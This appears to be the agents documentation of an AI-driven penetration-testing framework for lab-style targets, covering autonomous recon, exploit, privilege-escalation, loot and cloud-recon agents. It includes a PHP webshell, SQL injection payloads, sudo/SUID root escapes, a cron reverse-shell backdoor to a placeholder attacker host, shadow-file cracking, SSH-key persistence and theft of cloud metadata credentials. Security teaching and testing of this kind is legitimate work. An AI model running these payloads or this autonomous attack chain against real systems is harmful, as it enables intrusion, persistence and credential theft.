# Clicky Agents

> **Navigation**: [Usage](usage.md) | [Architecture](architecture.md) | [Agents](agents.md) | [Workflow](workflow.md) | [Skills](skills.md) | [Observability](observability.md) | [Sandboxing](sandboxing.md) | [README](../README.md)

---

## Table of Contents

1. [Understanding Agents](#understanding-agents)
2. [Recon Agent](#recon-agent)
3. [Decision Agent](#decision-agent)
4. [Exploit Agent](#exploit-agent)
5. [Privesc Agent](#privesc-agent)
6. [Loot Agent](#loot-agent)
7. [Cloud Recon Agent](#cloud-recon-agent)
8. [Source Analyzer Agent](#source-analyzer-agent)
9. [Verification Agent](#verification-agent)
10. [Report Agent](#report-agent)
11. [Severity Analyst Agent](#severity-analyst-agent)
12. [Agent Interaction Patterns](#agent-interaction-patterns)

---

## Understanding Agents

### What Makes an Agent Different from a Regular AI?

A regular AI conversation is stateless - you ask a question, get an answer, done. An **agent** is an AI configured to:

1. **Perform tasks autonomously**: Execute commands, read files, make decisions
2. **Use tools**: Run commands, read/write files, make network requests - in Clicky, every one of these goes through the MCP gateway (`mcp__plugin_clicky_clicky-gateway__*` tools) rather than a direct `Bash`/`Read`/`Write`/`Grep`/`WebFetch` tool; see each agent's own "Gateway Calling Convention" section (e.g. `agents/recon-agent.md`) for how that works
3. **Follow a specialized role**: Each agent is an expert in one domain
4. **Produce structured output**: JSON that other agents can parse

### Agent Anatomy

Every Clicky agent has these components:

```mermaid
flowchart TB
    subgraph AgentDefinition["Agent Definition File (.md)"]
        SP["System Prompt<br/>(Who am I? What do I do?)"]
        TOOLS["Tool Access<br/>(What can I use?)"]
        CONFIG["Configuration<br/>(Model, temperature, timeout)"]
    end

    subgraph Runtime["Runtime Behavior"]
        INPUT["Receive Input<br/>(Target, context, prior findings)"]
        PROCESS["Process & Execute<br/>(Run commands, analyze)"]
        OUTPUT["Return Output<br/>(Structured JSON)"]
    end

    AgentDefinition --> Runtime
    INPUT --> PROCESS --> OUTPUT
```

### The Agent Hierarchy

```mermaid
flowchart LR
    subgraph Reconnaissance["Phase 1: Reconnaissance"]
        RECON["Recon Agent"]
        CLOUD["Cloud Recon Agent"]
    end

    subgraph Analysis["Phase 2: Analysis"]
        DECISION["Decision Agent"]
    end

    subgraph Exploitation["Phase 3-4: Attack"]
        EXPLOIT["Exploit Agent"]
        PRIVESC["Privesc Agent"]
    end

    subgraph Collection["Phase 5: Collection"]
        LOOT["Loot Agent"]
    end

    subgraph WhiteBox["White-Box (parallel to Phase 1)"]
        SRC["Source Analyzer Agent"]
    end

    subgraph Review["Phase 6: Validation"]
        VERIFY["Verification Agent"]
    end

    subgraph Reporting["Phase 7: Reporting"]
        REPORT["Report Agent"]
    end

    subgraph SeverityReview["Phase 8: Severity Review"]
        SEVERITY["Severity Analyst Agent"]
    end

    SRC --> DECISION
    RECON --> DECISION
    CLOUD --> DECISION
    DECISION --> EXPLOIT
    EXPLOIT --> PRIVESC
    PRIVESC --> LOOT
    EXPLOIT --> LOOT
    EXPLOIT --> VERIFY
    PRIVESC --> VERIFY
    LOOT --> VERIFY
    CLOUD --> VERIFY
    VERIFY --> REPORT
    REPORT --> SEVERITY
```

---

## Recon Agent

### Purpose

The Recon Agent is your **eyes and ears**. Before you can attack anything, you need to know what's there. This agent discovers:

- What ports are open (where can we connect?)
- What services are running (what software is listening?)
- What versions are installed (are they vulnerable?)
- What environment is this (Linux? Windows? Cloud?)
- What subdomains exist, for a domain target (is the attack surface bigger than the one host?)

### Phase 0: Attack Surface Mapping

Before any port scanning happens, the Recon Agent checks whether the target it was given is a domain name rather than a bare IP/range/CIDR (`skills/target-validation`). If it is, it maps the DNS attack surface first via `skills/subdomain-enumeration`, ahead of everything described below:

```mermaid
flowchart LR
    START["Target given"] --> ISDOMAIN{"Domain name?<br/>(vs. bare IP/range/CIDR)"}
    ISDOMAIN -->|No| SKIP["Skip straight to<br/>Step 1: Full port scan"]
    ISDOMAIN -->|Yes| CASCADE["subdomain-enum.sh source cascade:<br/>crt.sh -> subfinder -> amass<br/>(passive by default)"]
    CASCADE --> RESOLVE["Resolve every merged,<br/>deduped candidate (dig/host)"]
    RESOLVE --> TAKEOVER{"CNAME matches a known<br/>provider + fingerprint hit?"}
    TAKEOVER -->|Yes| FLAG["takeover_candidate_detected: true<br/>(hands the finding to Exploit Agent)"]
    TAKEOVER -->|No| NEXT["Resolved names become new<br/>pivot targets (new tokens)"]
    FLAG --> NEXT
    NEXT --> STEP1["Step 1: Full port scan<br/>(for target + every pivot)"]
```

The source cascade degrades gracefully - each of the three sources (crt.sh certificate-transparency search, then `subfinder`, then `amass`) is skipped rather than treated as a failure if the tool isn't installed or returns nothing. `--active` (amass's own brute-force techniques) is only added when the engagement's rules of engagement explicitly permit it; the default is passive-only. A confirmed takeover candidate is a real, fingerprint-matched string hit on the response body, not just a CNAME pointing at a known provider - see `skills/subdomain-enumeration/SKILL.md` for the full methodology.

### How It Works

```mermaid
sequenceDiagram
    participant O as Orchestrator
    participant R as Recon Agent
    participant N as nmap
    participant T as Target

    O->>R: Enumerate 10.10.10.10

    Note over R: Step 1: Full port scan

    R->>N: nmap -p- -T4 10.10.10.10
    N->>T: TCP SYN to all 65535 ports
    T-->>N: RST (closed) or SYN-ACK (open)
    N-->>R: Ports 21, 22, 80, 445 open

    Note over R: Step 2: Service detection

    R->>N: nmap -sV -sC -p 21,22,80,445 10.10.10.10
    N->>T: Service probes
    T-->>N: Service banners
    N-->>R: FTP vsftpd 3.0.3, SSH OpenSSH 7.9...

    Note over R: Step 3: Quick access checks

    R->>T: FTP anonymous login attempt
    T-->>R: 230 Login successful

    R->>T: SMB null session attempt
    T-->>R: Access denied

    Note over R: Step 4: Compile results

    R-->>O: JSON with services, priorities, recommendations
```

### Technical Deep Dive: Port Scanning

**What is a port?** Think of an IP address as a building's street address. Ports are like apartment numbers - there are 65,535 of them (0-65535), and different services live at different ports.

**Common ports:**

| Port | Service | What It Does |
|------|---------|--------------|
| 21 | FTP | File transfer |
| 22 | SSH | Secure remote access |
| 80 | HTTP | Web (unencrypted) |
| 443 | HTTPS | Web (encrypted) |
| 445 | SMB | Windows file sharing |
| 3306 | MySQL | Database |
| 3389 | RDP | Windows remote desktop |

**How nmap finds open ports:**

```text
Your Computer                    Target
     |                              |
     |---[SYN]-------------------->|  "Hey, anyone there?"
     |                              |
     |<--[SYN-ACK]-----------------| (Port OPEN) "Yes, I'm listening!"
     |---[RST]-------------------->| "OK, just checking, bye"
     |                              |
     |---[SYN]-------------------->|  "Hey, anyone there?"
     |<--[RST]---------------------| (Port CLOSED) "Go away"
     |                              |
     |---[SYN]-------------------->|  "Hey, anyone there?"
     |          (silence)          | (Port FILTERED) Firewall blocked it
```

### Service Detection Explained

Finding an open port isn't enough. Port 80 usually runs HTTP, but it could run anything. **Service detection** sends probes and analyzes responses:

```text
nmap sends: "GET / HTTP/1.0\r\n\r\n"
Target responds: "HTTP/1.1 200 OK\r\nServer: Apache/2.4.41 (Ubuntu)\r\n..."

nmap concludes: Port 80 = HTTP, Apache 2.4.41, Ubuntu
```

This version information is critical for finding exploits.

### Recon Agent Output

```json
{
  "status": "success",
  "target": "10.10.10.10",
  "scan_duration": "127 seconds",

  "services": [
    {
      "port": 21,
      "protocol": "tcp",
      "state": "open",
      "service": "ftp",
      "product": "vsftpd",
      "version": "3.0.3",
      "extra_info": "Unix",

      "anonymous_access": true,
      "files_found": ["backup.zip", "notes.txt"],

      "attack_vectors": [
        {
          "technique": "anonymous_login",
          "mitre_id": "T1078.001",
          "description": "Anonymous FTP access allows unauthenticated file access"
        }
      ],

      "priority": 1,
      "priority_reason": "Anonymous access confirmed, high-value files present"
    },
    {
      "port": 80,
      "protocol": "tcp",
      "state": "open",
      "service": "http",
      "product": "Apache",
      "version": "2.4.41",

      "technologies": {
        "web_server": "Apache 2.4.41",
        "language": "PHP 7.4.3",
        "cms": "WordPress 5.8.1",
        "os": "Ubuntu"
      },

      "attack_vectors": [
        {
          "technique": "sqli",
          "mitre_id": "T1190",
          "description": "SQL injection in web application"
        },
        {
          "technique": "file_upload",
          "mitre_id": "T1105",
          "description": "Arbitrary file upload for webshell"
        }
      ],

      "priority": 2,
      "priority_reason": "WordPress detected, common target for vulnerabilities"
    }
  ],

  "environment": {
    "os_detection": "Linux 4.15 - 5.6",
    "os_family": "Linux",
    "hostname": "target.local",
    "active_directory": false,
    "cloud_provider": null,
    "container_hints": false
  },

  "summary": {
    "total_ports_scanned": 65535,
    "open_ports": 4,
    "services_identified": 4,
    "high_priority_targets": 2
  }
}
```

### Priority Assignment Logic

The Recon Agent's priority ordering comes from `skills/htb-decision-tree`'s self-calibrated data - real measured success rates from this operator's own accumulated session history where enough exist, honest heuristic ordering otherwise (see `service-prioritizer.py --show-matrix`, not a static table here - an earlier version of this doc claimed specific fixed percentages "from pentesting research," which turned out to have no backing dataset and disagreed with itself across multiple files):

| Condition | Priority | Reasoning |
|-----------|----------|-----------|
| FTP + Anonymous access | P1 | Often contains credentials; check current calibrated rate via `service-prioritizer.py --show-matrix` |
| SMB + Null session | P1 | Reveals users and files |
| HTTP + CMS detected | P2 | Many known vulnerabilities |
| SSH (no creds yet) | P3 | Need credentials from other sources |
| Unknown service | P4 | Requires manual investigation |

---

## Decision Agent

### Purpose

The Decision Agent is the **strategist**. It takes reconnaissance data and creates an attack plan. It answers:

- What should we attack first?
- What techniques should we use?
- What do we do if an attack fails?

### Persistent Memory

Decision Agent is the only agent with persistent memory (`memory: user` in its frontmatter, scoped to the operator rather than any one target or working directory). It's the natural place for this: it's analysis-only by charter — it never runs exploitation commands or handles raw credentials/loot directly, just summarized service and vulnerability data it's handed — so it's the agent least likely to accidentally conflate a generalizable lesson with a target's actual secrets.

Its memory is meant for *generalized* technique-effectiveness learning across engagements at a finer grain than the formal calibration mechanism can capture ("SMB null session succeeded against Samba 4.x in 6/8 observed engagements" - a version-specific pattern) — never for anything target-identifying (IPs, hostnames, credentials, client details). The agent's own frontmatter documents this boundary explicitly and is instructed to consult memory before analysis and update it after. This is complementary qualitative color layered on top of `skills/htb-decision-tree`'s own quantitative self-calibration (`skills/session-management/scripts/attempt-aggregator.sh`, fed by every agent's logged attempts) - the coarse per-service/technique success rates themselves are real computed data, not something decision-agent's memory needs to supply.

The other five agents don't have persistent memory yet — they handle credentials, hostnames, and loot as their normal job, which makes the same safe/never-store boundary much easier to get wrong. Extending memory to them is a deliberate future decision, not an oversight.

### The Decision Tree

This decision tree's shape (which service to check first, what to do on success/failure) is a reasonable heuristic starting point; the priority *weighting* behind it is self-calibrated from this operator's own accumulated session history (`skills/htb-decision-tree`), not a fixed research citation - see that skill's SKILL.md for how the calibration mechanism works and why an earlier version of this claim (asserting specific fabricated percentages as "pentesting research") didn't hold up.

```mermaid
flowchart TD
    START["Recon Complete<br/>Services Identified"] --> CHECK_FTP{"FTP (21) Found?"}

    CHECK_FTP -->|Yes| FTP_ANON{"Anonymous<br/>Access?"}
    FTP_ANON -->|Yes| DO_FTP["Priority 1<br/>Download all files<br/>Search for credentials"]
    FTP_ANON -->|No| CHECK_SMB

    CHECK_FTP -->|No| CHECK_SMB{"SMB (445) Found?"}
    CHECK_SMB -->|Yes| SMB_NULL{"Null Session<br/>Works?"}
    SMB_NULL -->|Yes| DO_SMB["Priority 1<br/>Enumerate shares<br/>Download files<br/>List users"]
    SMB_NULL -->|No| CHECK_HTTP

    CHECK_SMB -->|No| CHECK_HTTP{"HTTP (80/443)<br/>Found?"}
    CHECK_HTTP -->|Yes| DO_HTTP["Priority 2<br/>Tech detection<br/>Vuln scanning<br/>SQLi, Upload, LFI"]

    CHECK_HTTP -->|No| CHECK_OTHER{"Other Services?<br/>MySQL, Redis, RDP..."}
    CHECK_OTHER -->|Yes| DO_OTHER["Priority 3<br/>Default credentials<br/>Known exploits"]
    CHECK_OTHER -->|No| DEEP["Deeper Enumeration<br/>UDP scan<br/>Subdomain enum"]

    DO_FTP --> CREDS{"Credentials<br/>Found?"}
    DO_SMB --> CREDS
    DO_HTTP --> CREDS
    DO_OTHER --> CREDS

    CREDS -->|Yes| REUSE["Test Credential Reuse<br/>SSH, RDP, Web Login"]
    CREDS -->|No| NEXT["Try Next Priority"]
```

### Attack Chain Selection

The Decision Agent doesn't just pick one attack. It creates a **chain** - a sequence of attacks where each step enables the next.

**Chain A: Credential Hunting**

```text
1. Anonymous FTP → Download files
2. Search files for passwords/keys
3. Use credentials on SSH/RDP/Web
4. If access: Proceed to privesc
```

**Chain B: Web Exploitation**

```text
1. Enumerate web application
2. Find SQL injection or file upload
3. Get shell via webshell or SQLi → RCE
4. If access: Proceed to privesc
```

**Chain C: Default Credentials**

```text
1. Identify service (MySQL, Tomcat, etc.)
2. Try default credentials
3. If access: Proceed to exploitation
```

### Decision Agent Output

```json
{
  "status": "success",
  "analysis_time": "45 seconds",

  "attack_plan": {
    "primary_chain": "A",
    "chain_name": "Credential Hunting",
    "estimated_success": 0.85,

    "steps": [
      {
        "step": 1,
        "priority": 1,
        "action": "exploit_ftp_anonymous",
        "target": "10.10.10.10:21",
        "technique": "Anonymous FTP Access",
        "mitre_id": "T1078.001",
        "expected_outcome": "File access, potential credentials",
        "timeout": 120,
        "on_success": "proceed_to_step_2",
        "on_failure": "skip_to_step_3"
      },
      {
        "step": 2,
        "priority": 1,
        "action": "search_credentials",
        "target": "downloaded_files",
        "technique": "Credential Discovery",
        "mitre_id": "T1552.001",
        "search_patterns": [
          "password", "passwd", "pwd",
          "credential", "secret", "key",
          "-----BEGIN RSA PRIVATE KEY-----"
        ],
        "expected_outcome": "Cleartext passwords or SSH keys",
        "on_success": "proceed_to_step_3",
        "on_failure": "proceed_to_step_4"
      },
      {
        "step": 3,
        "priority": 2,
        "action": "credential_reuse",
        "targets": ["10.10.10.10:22", "10.10.10.10:80"],
        "technique": "Credential Reuse",
        "mitre_id": "T1078",
        "credentials_to_try": "${discovered_credentials}",
        "expected_outcome": "SSH or web application access",
        "on_success": "foothold_achieved",
        "on_failure": "proceed_to_step_4"
      },
      {
        "step": 4,
        "priority": 2,
        "action": "web_vulnerability_scan",
        "target": "10.10.10.10:80",
        "technique": "Web Application Attacks",
        "mitre_id": "T1190",
        "tests": ["sqli", "file_upload", "lfi", "command_injection"],
        "expected_outcome": "Web shell or database access",
        "on_success": "foothold_achieved",
        "on_failure": "escalate_to_manual"
      }
    ]
  },

  "fallback_plan": {
    "trigger": "all_automated_attacks_failed",
    "actions": [
      "Perform UDP scan for additional services",
      "Run more aggressive directory brute-force",
      "Check for subdomain takeover",
      "Manual code review if source available"
    ]
  },

  "risk_assessment": {
    "detection_risk": "low",
    "destructive_risk": "none",
    "estimated_time": "15-30 minutes"
  }
}
```

---

## Exploit Agent

### Purpose

The Exploit Agent is the **attacker**. It takes the attack plan and executes it, attempting to gain initial access to the target system.

### Exploitation Categories

```mermaid
mindmap
  root((Exploit Agent))
    Network Services
      FTP Anonymous
      SMB Null Session
      SSH Key Auth
      Default Credentials
    Web Applications
      SQL Injection
      File Upload
      LFI/RFI
      Command Injection
      Authentication Bypass
    Modern Infrastructure
      API Exploitation
      Container Escape
      Cloud Metadata
    Active Directory
      Kerberoasting
      Pass-the-Hash
      LLMNR Poisoning
```

### SQL Injection Deep Dive

**What is SQL Injection?**

Web applications often build database queries using user input. If they don't properly sanitize that input, attackers can inject their own SQL code.

**Vulnerable code:**

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
```

**Normal login:**

```text
Username: admin
Password: password123

Query becomes:
SELECT * FROM users WHERE username='admin' AND password='password123'
```

**SQL Injection attack:**

```text
Username: admin' OR '1'='1' --
Password: anything

Query becomes:
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
                                              ^^^^^^^^ Always true!
                                                        ^^ Comment ignores rest
```

The `OR '1'='1'` is always true, so the query returns all users. The `--` comments out the password check.

**Exploit Agent's SQLi testing process:**

```mermaid
sequenceDiagram
    participant E as Exploit Agent
    participant S as sqlmap
    participant T as Target

    E->>S: Test login form for SQLi

    Note over S: Step 1: Detect vulnerability

    S->>T: username=admin'
    T-->>S: SQL error in response
    Note over S: Error-based SQLi confirmed!

    Note over S: Step 2: Identify database

    S->>T: username=admin' AND 1=CONVERT(int,@@version)--
    T-->>S: Error reveals "Microsoft SQL Server 2019"

    Note over S: Step 3: Extract data

    S->>T: username=admin' UNION SELECT username,password FROM users--
    T-->>S: Returns all usernames and password hashes

    S-->>E: Found 3 users with password hashes

    E->>E: Attempt to crack hashes
```

### File Upload Exploitation

**What's the vulnerability?**

Web apps that allow file uploads (profile pictures, documents) can be tricked into accepting executable files (PHP, ASPX, JSP).

**Attack process:**

```mermaid
flowchart TD
    START["Find upload function"] --> TEST1{"Accepts .php?"}
    TEST1 -->|Yes| UPLOAD["Upload webshell.php"]
    TEST1 -->|No| TEST2{"Accepts .php5?<br/>.phtml?<br/>.phar?"}
    TEST2 -->|Yes| UPLOAD
    TEST2 -->|No| TEST3{"Double extension?<br/>shell.php.jpg"}
    TEST3 -->|Yes| UPLOAD
    TEST3 -->|No| TEST4{"Null byte?<br/>shell.php%00.jpg"}
    TEST4 -->|Yes| UPLOAD
    TEST4 -->|No| TEST5{"Content-Type<br/>bypass?"}
    TEST5 -->|Yes| UPLOAD
    TEST5 -->|No| FAIL["Upload blocked"]

    UPLOAD --> ACCESS["Access uploaded file"]
    ACCESS --> SHELL["Execute commands<br/>through webshell"]
```

**Simple PHP webshell:**

```php
<?php
// webshell.php
// WARNING: This is for educational/authorized testing only

if(isset($_GET['cmd'])) {
    echo "<pre>";
    echo shell_exec($_GET['cmd']);
    echo "</pre>";
}
?>
```

**Using the webshell:**

```text
http://target/uploads/webshell.php?cmd=whoami
Output: www-data

http://target/uploads/webshell.php?cmd=cat /etc/passwd
Output: root:x:0:0:root:/root:/bin/bash
        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
        ...
```

### Shell Stabilization

Raw webshells and basic reverse shells are fragile. The Exploit Agent stabilizes them:

```mermaid
flowchart LR
    subgraph Unstable["Unstable Shell"]
        U1["No arrow keys"]
        U2["No tab completion"]
        U3["Ctrl+C kills shell"]
        U4["No job control"]
    end

    subgraph Upgrade["Upgrade Process"]
        S1["python -c 'import pty;<br/>pty.spawn('/bin/bash')'"]
        S2["Ctrl+Z (background)"]
        S3["stty raw -echo; fg"]
        S4["export TERM=xterm"]
    end

    subgraph Stable["Stable Shell"]
        ST1["Full TTY"]
        ST2["Arrow keys work"]
        ST3["Tab completion"]
        ST4["Can use vim, nano"]
    end

    Unstable --> Upgrade --> Stable
```

### Exploit Agent Output

```json
{
  "status": "success",
  "exploitation_phase": "complete",

  "access_achieved": {
    "type": "reverse_shell",
    "user": "www-data",
    "privilege_level": "user",
    "shell_type": "bash",
    "stability": "stable",
    "connection": {
      "method": "php_webshell_to_reverse",
      "local_port": 4444
    }
  },

  "attack_path": [
    {
      "step": 1,
      "technique": "SQL Injection",
      "target": "http://10.10.10.10/login.php",
      "result": "Extracted admin password hash",
      "hash": "5f4dcc3b5aa765d61d8327deb882cf99"
    },
    {
      "step": 2,
      "technique": "Hash Cracking",
      "result": "Password cracked",
      "password": "password"
    },
    {
      "step": 3,
      "technique": "Admin Panel Access",
      "target": "http://10.10.10.10/admin/",
      "result": "Logged in as admin"
    },
    {
      "step": 4,
      "technique": "File Upload",
      "target": "http://10.10.10.10/admin/upload.php",
      "result": "Uploaded webshell.php"
    },
    {
      "step": 5,
      "technique": "Reverse Shell",
      "result": "Stable shell as www-data"
    }
  ],

  "credentials_found": [
    {
      "source": "database",
      "username": "admin",
      "password": "password",
      "hash": "5f4dcc3b5aa765d61d8327deb882cf99",
      "hash_type": "MD5"
    }
  ],

  "next_phase": "privilege_escalation"
}
```

---

## Privesc Agent

### Purpose

The Privesc Agent turns **limited access into complete control**. Getting a shell as `www-data` or a regular user is just the beginning. The goal is `root` (Linux) or `SYSTEM/Administrator` (Windows).

### Why Privilege Escalation Matters

```text
As www-data (web user):
- Can read web files
- Can't read /etc/shadow (password hashes)
- Can't install backdoors
- Can't access other users' files
- Limited to web directory

As root:
- Full system access
- Read all files
- Install persistent access
- Pivot to other systems
- Complete compromise
```

### Linux Privilege Escalation

```mermaid
flowchart TD
    USER["User Shell<br/>(www-data, user, etc.)"] --> ENUM["Run Enumeration<br/>(LinPEAS)"]

    ENUM --> SUDO{"sudo -l<br/>returns anything?"}
    SUDO -->|Yes| SUDO_EXPLOIT["Exploit sudo<br/>misconfiguration"]
    SUDO_EXPLOIT --> ROOT

    SUDO -->|No| SUID{"SUID binaries<br/>found?"}
    SUID -->|Yes| SUID_EXPLOIT["Exploit SUID<br/>(GTFOBins)"]
    SUID_EXPLOIT --> ROOT

    SUID -->|No| CRON{"Writable cron<br/>or PATH hijack?"}
    CRON -->|Yes| CRON_EXPLOIT["Exploit cron job"]
    CRON_EXPLOIT --> ROOT

    CRON -->|No| KERNEL{"Kernel<br/>vulnerable?"}
    KERNEL -->|Yes| KERNEL_EXPLOIT["Kernel exploit<br/>(DirtyPipe, etc.)"]
    KERNEL_EXPLOIT --> ROOT

    KERNEL -->|No| FAIL["Manual<br/>investigation"]

    ROOT["ROOT ACCESS"]
```

### Understanding SUDO Misconfiguration

**What is sudo?** The `sudo` command lets users run commands as another user (usually root). System admins configure what commands users can run with sudo.

**Check what you can run:**

```bash
$ sudo -l
User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vim
```

**Why is this vulnerable?** Vim can spawn a shell:

```bash
$ sudo vim -c ':!/bin/bash'
root@target# whoami
root
```

The Privesc Agent knows these "escape sequences" for many programs. This knowledge comes from **GTFOBins** (https://gtfobins.github.io/), a curated list of Unix binaries that can be exploited.

### Understanding SUID Binaries

**What is SUID?** The Set User ID bit makes a program run as its owner, not as the user who launched it. When a binary is owned by root and has SUID set, it runs as root even when launched by a regular user.

**Normal execution:**

```text
$ /usr/bin/cat /etc/shadow
Permission denied (running as www-data)
```

**SUID execution:**

```text
$ ls -l /usr/bin/passwd
-rwsr-xr-x 1 root root 59640 Mar 22 2019 /usr/bin/passwd
    ^
    The 's' means SUID is set

$ /usr/bin/passwd  # Runs as root, so it can modify /etc/shadow
```

**Finding exploitable SUID binaries:**

```bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find          # <-- This can be exploited!
/usr/bin/vim           # <-- This can be exploited!
/opt/custom_backup     # <-- Unknown binary, investigate!
```

**Exploiting SUID find:**

```bash
$ /usr/bin/find . -exec /bin/bash -p \;
root@target# whoami
root
```

### Windows Privilege Escalation

```mermaid
flowchart TD
    USER["User Shell"] --> ENUM["Run WinPEAS"]

    ENUM --> TOKEN{"SeImpersonate<br/>privilege?"}
    TOKEN -->|Yes| POTATO["Potato exploit<br/>(PrintSpoofer)"]
    POTATO --> ADMIN

    TOKEN -->|No| SERVICE{"Service<br/>misconfiguration?"}
    SERVICE -->|Yes| SVC_EXPLOIT["Exploit service"]
    SVC_EXPLOIT --> ADMIN

    SERVICE -->|No| SCHTASK{"Writable<br/>scheduled task?"}
    SCHTASK -->|Yes| TASK_EXPLOIT["Modify task"]
    TASK_EXPLOIT --> ADMIN

    SCHTASK -->|No| CREDS{"Stored<br/>credentials?"}
    CREDS -->|Yes| USE_CREDS["Use credentials"]
    USE_CREDS --> ADMIN

    CREDS -->|No| FAIL["Manual<br/>investigation"]

    ADMIN["ADMIN/SYSTEM"]
```

### The Potato Attacks Explained

**What is SeImpersonatePrivilege?**

Windows services often run with this privilege, which allows them to impersonate other users' tokens. If you can trick a high-privilege process into connecting to you, you can steal its token.

**How Potato attacks work:**

```mermaid
sequenceDiagram
    participant A as Attacker (Low Priv)
    participant S as SYSTEM Service
    participant P as Potato Tool

    A->>P: Launch Potato exploit
    P->>P: Create fake service endpoint
    P->>S: Trigger SYSTEM to connect
    S->>P: SYSTEM connects (authenticates)
    P->>P: Capture SYSTEM token
    P->>A: Execute command as SYSTEM

    Note over A: whoami returns "NT AUTHORITY\SYSTEM"
```

### Privesc Agent Output

```json
{
  "status": "success",
  "escalation_achieved": true,

  "initial_access": {
    "user": "www-data",
    "groups": ["www-data"],
    "privilege_level": "user"
  },

  "final_access": {
    "user": "root",
    "privilege_level": "root",
    "method": "sudo_vim_escape"
  },

  "credentials_found": [
    {"username": "root", "hash": "$6$xyz...", "hash_type": "sha512crypt"}
  ],

  "escalation_path": [
    {
      "step": 1,
      "action": "enumeration",
      "tool": "linpeas.sh",
      "findings": [
        "sudo vim without password",
        "SUID on /usr/bin/find",
        "Writable /etc/cron.d/"
      ]
    },
    {
      "step": 2,
      "action": "exploit_selection",
      "chosen": "sudo_vim_escape",
      "reason": "Highest success probability, no compilation needed"
    },
    {
      "step": 3,
      "action": "exploitation",
      "command": "sudo vim -c ':!/bin/bash'",
      "result": "Root shell obtained"
    },
    {
      "step": 4,
      "action": "persistence",
      "method": "ssh_key_injection",
      "target": "/root/.ssh/authorized_keys"
    }
  ],

  "alternative_paths": [
    {
      "method": "suid_find",
      "command": "find . -exec /bin/bash -p \\;",
      "status": "available_but_not_used"
    },
    {
      "method": "cron_hijack",
      "command": "echo 'bash -i >& /dev/tcp/ATTACKER/4445 0>&1' > /etc/cron.d/backdoor",
      "status": "available_but_not_used"
    }
  ]
}
```

---

## Loot Agent

### Purpose

The Loot Agent **extracts valuable data** after access is achieved. This includes:

- Credentials (passwords, hashes, keys)
- Configuration files
- Database contents
- Sensitive documents
- Evidence for reporting

### What to Extract and Why

```mermaid
mindmap
  root((Loot Priorities))
    P1: Credentials
      /etc/shadow
      SSH keys
      Database creds
      Browser passwords
      .bash_history
    P2: Configuration
      Network config
      Service configs
      Application settings
      Cloud credentials
    P3: Data
      Databases
      Documents
      Source code
      Backups
    P4: Intelligence
      User lists
      Network topology
      Internal documentation
```

### Linux Credential Extraction

**The /etc/shadow file:**

```text
root:$6$xyz...:18000:0:99999:7:::
     ^^^^^^^^^^^
     Password hash

Format: $algorithm$salt$hash
$1$ = MD5 (weak)
$5$ = SHA-256
$6$ = SHA-512 (most common)
$y$ = yescrypt (newest)
```

**Extracting and cracking:**

```bash
# On target (as root)
cat /etc/shadow > /tmp/shadow.txt
cat /etc/passwd > /tmp/passwd.txt

# Combine for cracking
unshadow passwd.txt shadow.txt > combined.txt

# Crack with John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
```

**SSH keys:**

```bash
# Find all SSH keys
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null

# Common locations
/home/*/.ssh/id_rsa
/root/.ssh/id_rsa
```

### Database Extraction

```mermaid
sequenceDiagram
    participant L as Loot Agent
    participant DB as Database
    participant F as File System

    L->>F: Read config files for DB creds
    F-->>L: mysql://root:password123@localhost/app

    L->>DB: Connect with credentials
    DB-->>L: Connected

    L->>DB: SHOW DATABASES;
    DB-->>L: information_schema, mysql, app

    L->>DB: USE app, SHOW TABLES;
    DB-->>L: users, orders, payments

    L->>DB: SELECT * FROM users;
    DB-->>L: id, username, password, email...

    L->>L: Save to loot/databases/app_users.csv
```

### Loot Organization

```text
loot/10.10.10.10/
|
|-- credentials/
|   |-- cleartext.txt          # user:password pairs
|   |-- hashes.txt             # user:hash pairs
|   |-- cracked.txt            # Successfully cracked
|   |-- ssh_keys/
|       |-- root_id_rsa        # Root's SSH key
|       |-- admin_id_rsa       # Admin's SSH key
|
|-- databases/
|   |-- mysql_users.csv        # MySQL user table
|   |-- app_dump.sql           # Full database dump
|
|-- configs/
|   |-- etc_passwd.txt         # /etc/passwd
|   |-- etc_shadow.txt         # /etc/shadow
|   |-- network_interfaces.txt # Network configuration
|   |-- ssh_config.txt         # SSH server config
|
|-- documents/
|   |-- passwords.xlsx         # Found password spreadsheet
|   |-- network_diagram.pdf    # Internal network docs
|
|-- evidence/
|   |-- root_proof.txt         # Proof of root access
|   |-- screenshots/           # Visual evidence
```

---

## Cloud Recon Agent

### Purpose

The Cloud Recon Agent specializes in **cloud and container environments**. It detects AWS, Azure, GCP, Kubernetes, and Docker, then enumerates their specific attack surfaces.

### Cloud Detection

```mermaid
flowchart TD
    START["Target Analysis"] --> DNS{"DNS indicates<br/>cloud?"}

    DNS -->|amazonaws.com| AWS["AWS Detected"]
    DNS -->|azure.com| AZURE["Azure Detected"]
    DNS -->|googleapis.com| GCP["GCP Detected"]
    DNS -->|No cloud DNS| HEADERS{"Check HTTP<br/>headers?"}

    HEADERS -->|X-Amz-*| AWS
    HEADERS -->|X-Azure-*| AZURE
    HEADERS -->|X-Cloud-*| GCP
    HEADERS -->|No cloud headers| META{"Metadata<br/>endpoint?"}

    META -->|169.254.169.254| IMDS["Cloud Instance<br/>Detected"]
    META -->|No response| CONTAINER{"Container<br/>indicators?"}

    CONTAINER -->|/.dockerenv exists| DOCKER["Docker Detected"]
    CONTAINER -->|K8s service account| K8S["Kubernetes Detected"]
```

### AWS Metadata Exploitation

**What is the metadata service?**

Cloud instances (EC2, Azure VMs, GCP Compute) have a special internal endpoint at `169.254.169.254` that provides instance information including **temporary credentials**.

**Exploitation process:**

```mermaid
sequenceDiagram
    participant A as Attacker (on EC2)
    participant M as Metadata Service
    participant AWS as AWS API

    A->>M: curl http://169.254.169.254/latest/meta-data/
    M-->>A: List of available metadata

    A->>M: curl .../meta-data/iam/security-credentials/
    M-->>A: EC2-Role-Name

    A->>M: curl .../meta-data/iam/security-credentials/EC2-Role-Name
    M-->>A: AccessKeyId, SecretAccessKey, Token

    Note over A: Now has temporary AWS credentials!

    A->>AWS: aws s3 ls (using stolen creds)
    AWS-->>A: List of S3 buckets

    A->>AWS: aws s3 cp s3://internal-bucket/secrets.txt .
    AWS-->>A: Downloaded sensitive file
```

